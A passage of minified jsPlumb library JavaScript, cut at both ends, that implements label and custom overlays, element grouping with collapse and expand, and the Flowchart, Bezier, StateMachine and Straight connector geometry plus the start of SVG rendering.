u=r.x-i[0]/2,c=r.y-i[1]/2;return{component:t,d:{minx:u,miny:c,td:i,cxy:r},minX:u,maxX:u+i[0],minY:c,maxY:c+i[1]}}return{minX:0,maxX:0,minY:0,maxY:0}}};n.extend(l,[e.jsPlumbUIComponent,s],{getDimensions:function(){return[1,1]},setVisible:function(t){this._jsPlumb.div&&(this._jsPlumb.div.style.display=t?"block":"none",t&&this._jsPlumb.initiallyInvisible&&(a(this,!0),this.component.repaint(),this._jsPlumb.initiallyInvisible=!1))},clearCachedDimensions:function(){this._jsPlumb.cachedDimensions=null},cleanup:function(t){t?null!=this._jsPlumb.div&&(this._jsPlumb.div._jsPlumb=null,this._jsPlumb.instance.removeElement(this._jsPlumb.div)):(this._jsPlumb&&this._jsPlumb.div&&this._jsPlumb.div.parentNode&&this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div),this.detached=!0)},reattach:function(t,e){null!=this._jsPlumb.div&&t.getContainer().appendChild(this._jsPlumb.div),this.detached=!1},computeMaxSize:function(){var t=a(this);return Math.max(t[0],t[1])},paint:function(t,e){this._jsPlumb.initialised||(this.getElement(),t.component.appendDisplayElement(this._jsPlumb.div),this._jsPlumb.initialised=!0,this.detached&&this._jsPlumb.div.parentNode.removeChild(this._jsPlumb.div)),this._jsPlumb.div.style.left=t.component.x+t.d.minx+"px",this._jsPlumb.div.style.top=t.component.y+t.d.miny+"px"}}),e.Overlays.Custom=function(t){this.type="Custom",l.apply(this,arguments)},n.extend(e.Overlays.Custom,l),e.Overlays.GuideLines=function(){var t=this;t.length=50,t.strokeWidth=5,this.type="GuideLines",s.apply(this,arguments),e.jsPlumbUIComponent.apply(this,arguments),this.draw=function(e,n){var i=e.pointAlongPathFrom(t.loc,t.length/2),r=e.pointOnPath(t.loc),s=o.pointOnLine(i,r,t.length),a=o.perpendicularLineTo(i,s,40),l=o.perpendicularLineTo(s,i,20);return{connector:e,head:i,tail:s,headLine:l,tailLine:a,minX:Math.min(i.x,s.x,l[0].x,l[1].x),minY:Math.min(i.y,s.y,l[0].y,l[1].y),maxX:Math.max(i.x,s.x,l[0].x,l[1].x),maxY:Math.max(i.y,s.y,l[0].y,l[1].y)}}},e.Overlays.Label=function(t){this.labelStyle=t.labelStyle,this.cssClass=null!=this.labelStyle?this.labelStyle.cssClass:null;var n=e.extend({create:function(){return e.createElement("div")}},t);if(e.Overlays.Custom.call(this,n),this.type="Label",this.label=t.label||"",this.labelText=null,this.labelStyle){var o=this.getElement();if(this.labelStyle.font=this.labelStyle.font||"12px sans-serif",o.style.font=this.labelStyle.font,o.style.color=this.labelStyle.color||"black",this.labelStyle.fill&&(o.style.background=this.labelStyle.fill),this.labelStyle.borderWidth>0){var i=this.labelStyle.borderStyle?this.labelStyle.borderStyle:"black";o.style.border=this.labelStyle.borderWidth+"px solid "+i}this.labelStyle.padding&&(o.style.padding=this.labelStyle.padding)}},n.extend(e.Overlays.Label,e.Overlays.Custom,{cleanup:function(t){t&&(this.div=null,this.label=null,this.labelText=null,this.cssClass=null,this.labelStyle=null)},getLabel:function(){return this.label},setLabel:function(t){this.label=t,this.labelText=null,this.clearCachedDimensions(),this.update(),this.component.repaint()},getDimensions:function(){return this.update(),l.prototype.getDimensions.apply(this,arguments)},update:function(){if("function"==typeof this.label){var t=this.label(this);this.getElement().innerHTML=t.replace(/\r\n/g,"<br/>")}else null==this.labelText&&(this.labelText=this.label,this.getElement().innerHTML=this.labelText.replace(/\r\n/g,"<br/>"))},updateFrom:function(t){null!=t.label&&this.setLabel(t.label)}})}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this;t.jsPlumb.extend(t.jsPlumbInstance.prototype,{getEventManager:function(){return(n=(e=this)._mottle)||(n=e._mottle=new t.Mottle),n;var e,n},on:function(t,e,n){return this.getEventManager().on.apply(this,arguments),this},off:function(t,e,n){return this.getEventManager().off.apply(this,arguments),this}})}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=t.jsPlumbUtil,n=t.jsPlumbInstance,o="jtk-group-collapsed",i="jtk-group-expanded",r="stop",s="revert",a="_groupManager",l="_jsPlumbGroup",d="show",u="hide",c=function(t){function n(e,n){for(var o=e.getMembers(),i=0;i<o.length;i++)t[n?d:u](o[i],!0)}function r(e){var n=e.getMembers(),o=t.getConnections({source:n,scope:"*"},!0),i=t.getConnections({target:n,scope:"*"},!0),r={};e.connections.source.length=0,e.connections.target.length=0;var s=function(t){for(var n=0;n<t.length;n++)r[t[n].id]||(r[t[n].id]=!0,t[n].source._jsPlumbGroup===e?(t[n].target._jsPlumbGroup!==e&&e.connections.source.push(t[n]),a[t[n].id]=e):t[n].target._jsPlumbGroup===e&&(e.connections.target.push(t[n]),c[t[n].id]=e))};s(o),s(i)}var s={},a={},c={},h=this;t.bind("connection",function(t){null!=t.source[l]&&null!=t.target[l]&&t.source[l]===t.target[l]?(a[t.connection.id]=t.source[l],c[t.connection.id]=t.source[l]):(null!=t.source[l]&&(e.suggest(t.source[l].connections.source,t.connection),a[t.connection.id]=t.source[l]),null!=t.target[l]&&(e.suggest(t.target[l].connections.target,t.connection),c[t.connection.id]=t.target[l]))}),t.bind("internal.connectionDetached",function(t){!function(t){delete t.proxies;var n,o=a[t.id];null!=o&&(n=function(e){return e.id===t.id},e.removeWithFunction(o.connections.source,n),e.removeWithFunction(o.connections.target,n),delete a[t.id]),null!=(o=c[t.id])&&(n=function(e){return e.id===t.id},e.removeWithFunction(o.connections.source,n),e.removeWithFunction(o.connections.target,n),delete c[t.id])}(t.connection)}),t.bind("connectionMoved",function(t){var e=(0===t.index?a:c)[t.connection.id];if(e){var n=e.connections[0===t.index?"source":"target"],o=n.indexOf(t.connection);-1!==o&&n.splice(o,1)}}),this.addGroup=function(e){t.addClass(e.getEl(),i),s[e.id]=e,e.manager=this,r(e),t.fire("group:add",{group:e})},this.addToGroup=function(e,n,o){if(e=this.getGroup(e)){var i=e.getEl();if(n._isJsPlumbGroup)return;var r=n._jsPlumbGroup;if(r!==e){var s=t.getOffset(n,!0),a=e.collapsed?t.getOffset(i,!0):t.getOffset(e.getDragArea(),!0);null!=r&&(r.remove(n,!1,o,!1,e),h.updateConnectionsForGroup(r)),e.add(n,o);var l=function(t,n){var o=0===n?1:0;t.each(function(t){t.setVisible(!1),t.endpoints[o].element._jsPlumbGroup===e?(t.endpoints[o].setVisible(!1),h.expandConnection(t,o,e)):(t.endpoints[n].setVisible(!1),h.collapseConnection(t,n,e))})};e.collapsed&&(l(t.select({source:n}),0),l(t.select({target:n}),1));var d=t.getId(n);t.dragManager.setParent(n,d,i,t.getId(i),s);var u={left:s.left-a.left,top:s.top-a.top};if(t.setPosition(n,u),t.dragManager.revalidateParent(n,d,s),h.updateConnectionsForGroup(e),t.revalidate(d),!o){var c={group:e,el:n};r&&(c.sourceGroup=r),t.fire("group:addMember",c)}}}},this.removeFromGroup=function(t,e,n){(t=this.getGroup(t))&&t.remove(e,null,n)},this.getGroup=function(t){var n=t;if(e.isString(t)&&null==(n=s[t]))throw new TypeError("No such group ["+t+"]");return n},this.getGroups=function(){var t=[];for(var e in s)t.push(s[e]);return t},this.removeGroup=function(e,n,o,i){e=this.getGroup(e),this.expandGroup(e,!0);var r=e[n?"removeAll":"orphanAll"](o,i);return t.remove(e.getEl()),delete s[e.id],delete t._groups[e.id],t.fire("group:remove",{group:e}),r},this.removeAllGroups=function(t,e,n){for(var o in s)this.removeGroup(s[o],t,e,n)};var p=this.collapseConnection=function(e,n,o){var i,r=o.getEl(),s=t.getId(r),a=e.endpoints[n].elementId,d=e.endpoints[0===n?1:0].element;d[l]&&!d[l].shouldProxy()&&d[l].collapsed||(e.proxies=e.proxies||[],(i=e.proxies[n]?e.proxies[n].ep:t.addEndpoint(r,{endpoint:o.getEndpoint(e,n),anchor:o.getAnchor(e,n),parameters:{isProxyEndpoint:!0}})).setDeleteOnEmpty(!0),e.proxies[n]={ep:i,originalEp:e.endpoints[n]},0===n?t.anchorManager.sourceChanged(a,s,e,r):(t.anchorManager.updateOtherEndpoint(e.endpoints[0].elementId,a,s,e),e.target=r,e.targetId=s),e.proxies[n].originalEp.detachFromConnection(e,null,!0),i.connections=[e],e.endpoints[n]=i,e.setVisible(!0))};this.collapseGroup=function(e){if(null!=(e=this.getGroup(e))&&!e.collapsed){var r=e.getEl();if(n(e,!1),e.shouldProxy()){var s=function(t,n){for(var o=0;o<t.length;o++){var i=t[o];p(i,n,e)}};s(e.connections.source,0),s(e.connections.target,1)}e.collapsed=!0,t.removeClass(r,i),t.addClass(r,o),t.revalidate(r),t.fire("group:collapse",{group:e})}};var f=this.expandConnection=function(e,n,o){if(null!=e.proxies&&null!=e.proxies[n]){var i=t.getId(o.getEl()),r=e.proxies[n].originalEp.element,s=e.proxies[n].originalEp.elementId;e.endpoints[n]=e.proxies[n].originalEp,0===n?t.anchorManager.sourceChanged(i,s,e,r):(t.anchorManager.updateOtherEndpoint(e.endpoints[0].elementId,i,s,e),e.target=r,e.targetId=s),e.proxies[n].ep.detachFromConnection(e,null),e.proxies[n].originalEp.addConnection(e),delete e.proxies[n]}};this.expandGroup=function(e,r){if(null!=(e=this.getGroup(e))&&e.collapsed){var s=e.getEl();if(n(e,!0),e.shouldProxy()){var a=function(t,n){for(var o=0;o<t.length;o++){var i=t[o];f(i,n,e)}};a(e.connections.source,0),a(e.connections.target,1)}e.collapsed=!1,t.addClass(s,i),t.removeClass(s,o),t.revalidate(s),this.repaintGroup(e),r||t.fire("group:expand",{group:e})}},this.repaintGroup=function(e){for(var n=(e=this.getGroup(e)).getMembers(),o=0;o<n.length;o++)t.revalidate(n[o])},this.updateConnectionsForGroup=r,this.refreshAllGroups=function(){for(var e in s)r(s[e]),t.dragManager.updateOffsets(t.getId(s[e].getEl()))}};n.prototype.addGroup=function(n){var o=this;if(o._groups=o._groups||{},null!=o._groups[n.id])throw new TypeError("cannot create Group ["+n.id+"]; a Group with that ID exists");if(null!=n.el[l])throw new TypeError("cannot create Group ["+n.id+"]; the given element is already a Group");var i=new function(n,o){function i(t,e){var o=t.offsetParent,i=n.getSize(o),r=n.getSize(t),s=e[0],a=s+r[0],l=e[1],d=l+r[1];return a>0&&s<i[0]&&d>0&&l<i[1]}function a(t){var e=n.getId(t),o=n.getOffset(t);return t.parentNode.removeChild(t),n.getContainer().appendChild(t),n.setPosition(t,o),delete t._jsPlumbGroup,c(t),n.dragManager.clearParent(t,e),[e,o]}function d(t){var e=null;if(!i(t.el,t.pos)){var o=t.el._jsPlumbGroup;w?n.remove(t.el):e=a(t.el),o.remove(t.el)}return e}function u(t){var e=n.getId(t);n.revalidate(t),n.dragManager.revalidateParent(t,e)}function c(t){t._katavorioDrag&&((w||m)&&t._katavorioDrag.off(r,d),w||m||!v||(t._katavorioDrag.off(s,u),t._katavorioDrag.setRevert(null)))}function h(t){t._katavorioDrag&&((w||m)&&t._katavorioDrag.on(r,d),b&&t._katavorioDrag.setConstrain(!0),_&&t._katavorioDrag.setUseGhostProxy(!0),w||m||!v||(t._katavorioDrag.on(s,u),t._katavorioDrag.setRevert(function(t,e){return!i(t,e)})))}var p=this,f=o.el;this.getEl=function(){return f},this.id=o.id||e.uuid(),f._isJsPlumbGroup=!0;var g=this.getDragArea=function(){var t=n.getSelector(f,"[jtk-group-content]");return t&&t.length>0?t[0]:f},_=!0===o.ghost,b=_||!0===o.constrain,v=!1!==o.revert,m=!0===o.orphan,w=!0===o.prune,j=!0===o.dropOverride,y=!1!==o.proxied,P=[];if(this.connections={source:[],target:[],internal:[]},this.getAnchor=function(t,e){return o.anchor||"Continuous"},this.getEndpoint=function(t,e){return o.endpoint||["Dot",{radius:10}]},this.collapsed=!1,!1!==o.draggable){var E={stop:function(t){n.fire("groupDragStop",jsPlumb.extend(t,{group:p}))},scope:"_jsPlumbGroupDrag"};o.dragOptions&&t.jsPlumb.extend(E,o.dragOptions),n.draggable(o.el,E)}!1!==o.droppable&&n.droppable(o.el,{drop:function(t){var e=t.drag.el;if(!e._isJsPlumbGroup){var o=e._jsPlumbGroup;if(o!==p){if(null!=o&&o.overrideDrop(e,p))return;n.getGroupManager().addToGroup(p,e,!1)}}}});var x=function(t,e){for(var n=null==t.nodeType?t:[t],o=0;o<n.length;o++)e(n[o])};this.overrideDrop=function(t,e){return j&&(v||w||m)},this.add=function(t,e){var o=g();x(t,function(t){if(null!=t._jsPlumbGroup){if(t._jsPlumbGroup===p)return;t._jsPlumbGroup.remove(t,!0,e,!1)}t._jsPlumbGroup=p,P.push(t),n.isAlreadyDraggable(t)&&h(t),t.parentNode!==o&&o.appendChild(t)}),n.getGroupManager().updateConnectionsForGroup(p)},this.remove=function(t,o,i,r,s){x(t,function(t){if(delete t._jsPlumbGroup,e.removeWithFunction(P,function(e){return e===t}),o)try{p.getDragArea().removeChild(t)}catch(t){jsPlumbUtil.log("Could not remove element from Group "+t)}if(c(t),!i){var r={group:p,el:t};s&&(r.targetGroup=s),n.fire("group:removeMember",r)}}),r||n.getGroupManager().updateConnectionsForGroup(p)},this.removeAll=function(t,e){for(var o=0,i=P.length;o<i;o++){var r=P[0];p.remove(r,t,e,!0),n.remove(r,!0)}P.length=0,n.getGroupManager().updateConnectionsForGroup(p)},this.orphanAll=function(){for(var t={},e=0;e<P.length;e++){var n=a(P[e]);t[n[0]]=n[1]}return P.length=0,t},this.getMembers=function(){return P},f[l]=this,n.bind("elementDraggable",function(t){t.el._jsPlumbGroup===this&&h(t.el)}.bind(this)),this.shouldProxy=function(){return y},n.getGroupManager().addGroup(this)}(o,n);return o._groups[i.id]=i,n.collapsed&&this.collapseGroup(i),i},n.prototype.addToGroup=function(t,e,n){var o=function(e){var o=this.getId(e);this.manage(o,e),this.getGroupManager().addToGroup(t,e,n)}.bind(this);if(Array.isArray(e))for(var i=0;i<e.length;i++)o(e[i]);else o(e)},n.prototype.removeFromGroup=function(t,e,n){this.getGroupManager().removeFromGroup(t,e,n)},n.prototype.removeGroup=function(t,e,n,o){return this.getGroupManager().removeGroup(t,e,n,o)},n.prototype.removeAllGroups=function(t,e,n){this.getGroupManager().removeAllGroups(t,e,n)},n.prototype.getGroup=function(t){return this.getGroupManager().getGroup(t)},n.prototype.getGroups=function(){return this.getGroupManager().getGroups()},n.prototype.expandGroup=function(t){this.getGroupManager().expandGroup(t)},n.prototype.collapseGroup=function(t){this.getGroupManager().collapseGroup(t)},n.prototype.repaintGroup=function(t){this.getGroupManager().repaintGroup(t)},n.prototype.toggleGroup=function(t){null!=(t=this.getGroupManager().getGroup(t))&&this.getGroupManager()[t.collapsed?"expandGroup":"collapseGroup"](t)},n.prototype.getGroupManager=function(){var t=this[a];return null==t&&(t=this[a]=new c(this)),t},n.prototype.removeGroupManager=function(){delete this[a]},n.prototype.getGroupFor=function(t){if(t=this.getElement(t))return t[l]}}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil,n="Straight";t.Connectors.Flowchart=function(e){this.type="Flowchart",(e=e||{}).stub=null==e.stub?30:e.stub;var o,i=t.Connectors.AbstractConnector.apply(this,arguments),r=null==e.midpoint?.5:e.midpoint,s=!0===e.alwaysRespectStubs,a=null,l=null,d=null!=e.cornerRadius?e.cornerRadius:0,u=(e.loopbackRadius,function(t){return t<0?-1:0===t?0:1}),c=function(t){return[u(t[2]-t[0]),u(t[3]-t[1])]},h=function(t,e,n,o){if(a!==e||l!==n){var i=null==a?o.sx:a,r=null==l?o.sy:l,s=i===e?"v":"h";a=e,l=n,t.push([i,r,e,n,s])}},p=function(t){return Math.sqrt(Math.pow(t[0]-t[2],2)+Math.pow(t[1]-t[3],2))},f=function(t){var e=[];return e.push.apply(e,t),e};this._compute=function(t,e){o=[],a=null,l=null;var u=function(){return[t.startStubX,t.startStubY,t.endStubX,t.endStubY]},g={perpendicular:u,orthogonal:u,opposite:function(e){var n=t,o="x"===e?0:1;return!s&&{x:function(){return 1===n.so[o]&&(n.startStubX>n.endStubX&&n.tx>n.startStubX||n.sx>n.endStubX&&n.tx>n.sx)||-1===n.so[o]&&(n.startStubX<n.endStubX&&n.tx<n.startStubX||n.sx<n.endStubX&&n.tx<n.sx)},y:function(){return 1===n.so[o]&&(n.startStubY>n.endStubY&&n.ty>n.startStubY||n.sy>n.endStubY&&n.ty>n.sy)||-1===n.so[o]&&(n.startStubY<n.endStubY&&n.ty<n.startStubY||n.sy<n.endStubY&&n.ty<n.sy)}}[e]()?{x:[(t.sx+t.tx)/2,t.startStubY,(t.sx+t.tx)/2,t.endStubY],y:[t.startStubX,(t.sy+t.ty)/2,t.endStubX,(t.sy+t.ty)/2]}[e]:[t.startStubX,t.startStubY,t.endStubX,t.endStubY]}}[t.anchorOrientation](t.sourceAxis),_="x"===t.sourceAxis?0:1,b="x"===t.sourceAxis?1:0,v=g[_],m=g[b],w=g[_+2],j=g[b+2];h(o,g[0],g[1],t);var y=t.startStubX+(t.endStubX-t.startStubX)*r,P=t.startStubY+(t.endStubY-t.startStubY)*r,E={x:[0,1],y:[1,0]},x={perpendicular:function(e){var n=t,o={x:[[n.startStubX,n.endStubX],null,[n.endStubX,n.startStubX]],y:[[n.startStubY,n.endStubY],null,[n.endStubY,n.startStubY]]},i={x:[[y,n.startStubY],[y,n.endStubY]],y:[[n.startStubX,P],[n.endStubX,P]]},r={x:[[n.endStubX,n.startStubY]],y:[[n.startStubX,n.endStubY]]},s={x:[[n.startStubX,n.endStubY],[n.endStubX,n.endStubY]],y:[[n.endStubX,n.startStubY],[n.endStubX,n.endStubY]]},a={x:[[n.startStubX,P],[n.endStubX,P],[n.endStubX,n.endStubY]],y:[[y,n.startStubY],[y,n.endStubY],[n.endStubX,n.endStubY]]},l={x:[n.startStubY,n.endStubY],y:[n.startStubX,n.endStubX]},d=E[e][0],u=E[e][1],c=n.so[d]+1,h=n.to[u]+1,p=-1===n.to[u]&&l[e][1]<l[e][0]||1===n.to[u]&&l[e][1]>l[e][0],f=o[e][c][0],g=o[e][c][1],_={x:[[[1,2,3,4],null,[2,1,4,3]],null,[[4,3,2,1],null,[3,4,1,2]]],y:[[[3,2,1,4],null,[2,3,4,1]],null,[[4,1,2,3],null,[1,4,3,2]]]}[e][c][h];return n.segment===_[3]||n.segment===_[2]&&p?i[e]:n.segment===_[2]&&g<f?r[e]:n.segment===_[2]&&g>=f||n.segment===_[1]&&!p?a[e]:n.segment===_[0]||n.segment===_[1]&&p?s[e]:void 0},orthogonal:function(e,n,o,i,r){var s=t,a={x:-1===s.so[0]?Math.min(n,i):Math.max(n,i),y:-1===s.so[1]?Math.min(n,i):Math.max(n,i)}[e];return{x:[[a,o],[a,r],[i,r]],y:[[o,a],[r,a],[r,i]]}[e]},opposite:function(n,o,r,s){var a=t,l={x:"y",y:"x"}[n],d={x:"height",y:"width"}[n],u=a["is"+n.toUpperCase()+"GreaterThanStubTimes2"];if(e.sourceEndpoint.elementId===e.targetEndpoint.elementId){var c=r+(1-e.sourceEndpoint.anchor[l])*e.sourceInfo[d]+i.maxStub;return{x:[[o,c],[s,c]],y:[[c,o],[c,s]]}[n]}return!u||1===a.so[_]&&o>s||-1===a.so[_]&&o<s?{x:[[o,P],[s,P]],y:[[y,o],[y,s]]}[n]:1===a.so[_]&&o<s||-1===a.so[_]&&o>s?{x:[[y,a.sy],[y,a.ty]],y:[[a.sx,P],[a.tx,P]]}[n]:void 0}}[t.anchorOrientation](t.sourceAxis,v,m,w,j);if(x)for(var C=0;C<x.length;C++)h(o,x[C][0],x[C][1],t);h(o,g[2],g[3],t),h(o,t.tx,t.ty,t),function(t,e,o){for(var r,s,a,l=null,u=0;u<e.length-1;u++){if(l=l||f(e[u]),r=f(e[u+1]),s=c(l),a=c(r),d>0&&l[4]!==r[4]){var h=Math.min(p(l),p(r)),g=Math.min(d,h/2);l[2]-=s[0]*g,l[3]-=s[1]*g,r[0]+=a[0]*g,r[1]+=a[1]*g;var _=s[1]===a[0]&&1===a[0]||s[1]===a[0]&&0===a[0]&&s[0]!==a[1]||s[1]===a[0]&&-1===a[0],b=(r[1]>l[3]?1:-1)==(r[0]>l[2]?1:-1),v=b&&_||!b&&!_?r[0]:l[2],m=b&&_||!b&&!_?l[3]:r[1];i.addSegment(t,n,{x1:l[0],y1:l[1],x2:l[2],y2:l[3]}),i.addSegment(t,"Arc",{r:g,x1:l[2],y1:l[3],x2:r[0],y2:r[1],cx:v,cy:m,ac:_})}else{var w=l[2]===l[0]?0:l[2]>l[0]?o.lw/2:-o.lw/2,j=l[3]===l[1]?0:l[3]>l[1]?o.lw/2:-o.lw/2;i.addSegment(t,n,{x1:l[0]-w,y1:l[1]-j,x2:l[2]+w,y2:l[3]+j})}l=r}null!=r&&i.addSegment(t,n,{x1:r[0],y1:r[1],x2:r[2],y2:r[3]})}(this,o,t)}},e.extend(t.Connectors.Flowchart,t.Connectors.AbstractConnector)}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil;t.Connectors.AbstractBezierConnector=function(e){var n,o=!1!==(e=e||{}).showLoopback,i=(e.curviness,e.margin||5),r=(e.proximityLimit,e.orientation&&"clockwise"===e.orientation),s=e.loopbackRadius||25;return this._compute=function(t,e){var a=e.sourcePos,l=e.targetPos,d=Math.abs(a[0]-l[0]),u=Math.abs(a[1]-l[1]);if(o&&e.sourceEndpoint.elementId===e.targetEndpoint.elementId){!0;var c=e.sourcePos[0],h=e.sourcePos[1]-i,p=c,f=h-s,g=p-s,_=f-s;d=2*s,u=2*s,t.points[0]=g,t.points[1]=_,t.points[2]=d,t.points[3]=u,n.addSegment(this,"Arc",{loopback:!0,x1:c-g+4,y1:h-_,startAngle:0,endAngle:2*Math.PI,r:s,ac:!r,x2:c-g-4,y2:h-_,cx:p-g,cy:f-_})}else!1,this._computeBezier(t,e,a,l,d,u)},n=t.Connectors.AbstractConnector.apply(this,arguments)},e.extend(t.Connectors.AbstractBezierConnector,t.Connectors.AbstractConnector);var n=function(e){e=e||{},this.type="Bezier";var n=t.Connectors.AbstractBezierConnector.apply(this,arguments),o=e.curviness||150;this.getCurviness=function(){return o},this._findControlPoint=function(t,e,n,i,r,s,a){var l=[];return s[0]!==a[0]||s[1]===a[1]?(0===a[0]?l.push(n[0]<e[0]?t[0]+10:t[0]-10):l.push(t[0]+o*a[0]),0===a[1]?l.push(n[1]<e[1]?t[1]+10:t[1]-10):l.push(t[1]+o*s[1])):(0===s[0]?l.push(e[0]<n[0]?t[0]+10:t[0]-10):l.push(t[0]-o*s[0]),0===s[1]?l.push(e[1]<n[1]?t[1]+10:t[1]-10):l.push(t[1]+o*a[1])),l},this._computeBezier=function(t,e,o,i,r,s){var a,l,d=o[0]<i[0]?r:0,u=o[1]<i[1]?s:0,c=o[0]<i[0]?0:r,h=o[1]<i[1]?0:s;a=this._findControlPoint([d,u],o,i,e.sourceEndpoint,e.targetEndpoint,t.so,t.to),l=this._findControlPoint([c,h],i,o,e.targetEndpoint,e.sourceEndpoint,t.to,t.so),n.addSegment(this,"Bezier",{x1:d,y1:u,x2:c,y2:h,cp1x:a[0],cp1y:a[1],cp2x:l[0],cp2y:l[1]})}};t.Connectors.Bezier=n,e.extend(n,t.Connectors.AbstractBezierConnector)}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil,n=function(e){e=e||{},this.type="StateMachine";var n,o=t.Connectors.AbstractBezierConnector.apply(this,arguments),i=e.curviness||10,r=e.margin||5,s=e.proximityLimit||80;e.orientation&&e.orientation,this._computeBezier=function(t,e,a,l,d,u){var c=e.sourcePos[0]<e.targetPos[0]?0:d,h=e.sourcePos[1]<e.targetPos[1]?0:u,p=e.sourcePos[0]<e.targetPos[0]?d:0,f=e.sourcePos[1]<e.targetPos[1]?u:0;0===e.sourcePos[2]&&(c-=r),1===e.sourcePos[2]&&(c+=r),0===e.sourcePos[3]&&(h-=r),1===e.sourcePos[3]&&(h+=r),0===e.targetPos[2]&&(p-=r),1===e.targetPos[2]&&(p+=r),0===e.targetPos[3]&&(f-=r),1===e.targetPos[3]&&(f+=r);var g,_,b,v,m,w,j,y,P,E,x,C,S,I,A,T=(c+p)/2,k=(h+f)/2,D=(w=h,y=f,(m=c)<=(j=p)&&y<=w?1:m<=j&&w<=y?2:j<=m&&y>=w?3:4),N=Math.sqrt(Math.pow(p-c,2)+Math.pow(f-h,2));P=T,E=k,x=D,C=e.sourcePos,S=e.targetPos,I=i,A=i,g=(n=N<=s?[P,E]:1===x?C[3]<=0&&S[3]>=1?[P+(C[2]<.5?-1*I:I),E]:C[2]>=1&&S[2]<=0?[P,E+(C[3]<.5?-1*A:A)]:[P+-1*I,E+-1*A]:2===x?C[3]>=1&&S[3]<=0?[P+(C[2]<.5?-1*I:I),E]:C[2]>=1&&S[2]<=0?[P,E+(C[3]<.5?-1*A:A)]:[P+I,E+-1*A]:3===x?C[3]>=1&&S[3]<=0?[P+(C[2]<.5?-1*I:I),E]:C[2]<=0&&S[2]>=1?[P,E+(C[3]<.5?-1*A:A)]:[P+-1*I,E+-1*A]:4===x?C[3]<=0&&S[3]>=1?[P+(C[2]<.5?-1*I:I),E]:C[2]<=0&&S[2]>=1?[P,E+(C[3]<.5?-1*A:A)]:[P+I,E+-1*A]:void 0)[0],_=n[0],b=n[1],v=n[1],o.addSegment(this,"Bezier",{x1:p,y1:f,x2:c,y2:h,cp1x:g,cp1y:b,cp2x:_,cp2y:v})}};t.Connectors.StateMachine=n,e.extend(n,t.Connectors.AbstractBezierConnector)}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil,n="Straight",o=function(e){this.type=n;var o=t.Connectors.AbstractConnector.apply(this,arguments);this._compute=function(t,e){o.addSegment(this,n,{x1:t.sx,y1:t.sy,x2:t.startStubX,y2:t.startStubY}),o.addSegment(this,n,{x1:t.startStubX,y1:t.startStubY,x2:t.endStubX,y2:t.endStubY}),o.addSegment(this,n,{x1:t.endStubX,y1:t.endStubY,x2:t.tx,y2:t.ty})}};t.Connectors.Straight=o,e.extend(o,t.Connectors.AbstractConnector)}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this.jsPlumb,e=this.jsPlumbUtil,n={"stroke-linejoin":"stroke-linejoin","stroke-dashoffset":"stroke-dashoffset","stroke-linecap":"stroke-linecap"},o="stroke-dasharray",i="dashstyle",r="http://www.w3.org/2000/svg",s=function(t,e){for(var n in e)t.setAttribute(n,""+e[n])},a=function(e,n){return(n=n||{}).version="1.1",n.xmlns=r,t.createElementNS(r,e,null,null,n)},l=function(t){return"position:absolute;left:"+t[0]+"px;top:"+t[1]+"px"},d=function(t){for(var e=t.querySelectorAll(" defs,linearGradient,radialGradient"),n=0;n<e.length;n++)e[n].parentNode.removeChild(e[n])},u=function(t,e,r,s,l){if(e.setAttribute("fill",r.fill?r.fill:"none"),e.setAttribute("stroke",r.stroke?r.stroke:"none"),r.gradient?function(t,e,n,o,i){var r,s="jsplumb_gradient_"+i._jsPlumb.instance.idstamp();d(t),r=n.gradient.offset?a("radialGradient",{id:s}):a("linearGradient",{id:s,gradientUnits:"userSpaceOnUse"});var l=a("defs");t.appendChild(l),l.appendChild(r);for(var u=0;u<n.gradient.stops.length;u++){var c=1===i.segment||2===i.segment?u:n.gradient.stops.length-1-u,h=n.gradient.stops[c][1],p=a("stop",{offset:Math.floor(100*n.gradient.stops[u][0])+"%","stop-color":h});r.appendChild(p)}var f=n.stroke?"stroke":"fill";e.setAttribute(f,"url(#"+s+")")}(t,e,r,0,l):(d(t),e.setAttribute("style","")),r.strokeWidth&&e.setAttribute("stroke-width",r.strokeWidth),r[i]&&r.strokeWidth&&!r[o]){var u=-1===r[i].indexOf(",")?" ":",",c="";r[i].split(u).forEach(function(t){c+=Math.floor(t*r.strokeWidth)+u}),e.setAttribute(o,c)}else r[o]&&e.setAttribute(o,r[o]);for(var h in n)r[h]&&e.setAttribute(n[h],r[h])},c=function(t,e,n){t.childNodes.length>n?t.insertBefore(e,t.childNodes[n]):t.appendChild(e)};e.svg={node:a,attr:s,pos:l};var h=function(n){var o=n.pointerEventsSpec||"all",i={};t.jsPlumbUIComponent.apply(this,n.originalArgs),this.canvas=null,this.path=null,this.svg=null,this.bgCanvas=null;var r=n.cssClass+" "+(n.originalArgs[0].cssClass||""),d={style:"",width:0,height:0,"pointer-events":o,position:"absolute"};this.svg=a("svg",d),n.useDivWrapper?(this.canvas=t.createElement("div",{position:"absolute"}),e.sizeElement(this.canvas,0,0,1,1),this.canvas.className=r):(s(this.svg,{class:r}),this.canvas=this.svg),n._jsPlumb.appendElement(this.canvas,n.originalArgs[0].parent),n.useDivWrapper&&this.canvas.appendChild(this.svg);var u=[this.canvas];return this.getDisplayElements=function(){return u},this.appendDisplayElement=function(t){u.push(t)},this.paint=function(t,o,r){if(null!=t){var 